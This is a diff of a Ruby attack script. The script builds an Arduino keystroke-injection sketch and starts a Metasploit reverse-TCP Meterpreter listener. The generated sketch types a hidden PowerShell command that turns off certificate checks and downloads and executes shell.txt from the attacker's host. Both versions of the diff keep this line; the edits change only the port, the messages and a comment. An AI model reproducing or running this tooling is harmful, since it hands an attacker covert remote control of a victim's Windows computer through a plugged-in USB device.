@@ -116,7 +116,7 @@ def arduino_setup(host)
   s << "  Keyboard.press('y');\n"
   s << "  Keyboard.releaseAll();\n"
   s << "  delay(500);\n"
-  s << "  Keyboard.print(\"powershell -windowstyle hidden \\\"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}:8080/shell.txt')\\\"\");\n"
+  s << "  Keyboard.print(\"powershell -windowstyle hidden \\\"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\\\"\");\n"
   s << "  typeKey(KEY_RETURN);\n"
   s << "  Keyboard.end();\n"
   s << "}\n\n"
@@ -131,7 +131,7 @@ def arduino_setup(host)
 end
 
 def metasploit_setup(msf_path, host, port)
-  print_info("Start a web server with:\n\n  cd ~ && python3 -m http.server 8080\n\n")
+  print_info("Starting Metasploit listener...\n")
   rc_file = "#{Dir.home}/msf_listener.rc"
   File.open(rc_file, 'w') do |file|
     file.puts("use exploit/multi/handler")
@@ -145,13 +145,13 @@ def metasploit_setup(msf_path, host, port)
   system("#{msf_path}msfconsole -r #{rc_file}")
 end
 
-# --- Begin script execution ---
+# --- Start Script ---
 
 @set_payload = 'windows/meterpreter/reverse_tcp'
 
 msf_path = `which msfvenom`.strip
 if msf_path.empty?
-  print_error("Metasploit not found! Install it with: pkg install metasploit\n")
+  print_error("Metasploit not found! Install with: pkg install metasploit\n")
   exit
 end
 msf_path = msf_path.sub('msfvenom', '')
@@ -165,4 +165,4 @@ arduino_setup(host)
 msf = rgets('Start Metasploit listener now? [yes/no]: ', 'no')
 metasploit_setup(msf_path, host, port) if msf.downcase == 'yes'
 
-print_info("All done! Payload hosted at: http://#{host}:8080/shell.txt\n")
+print_info("All done! Files saved in your $HOME directory.\n")
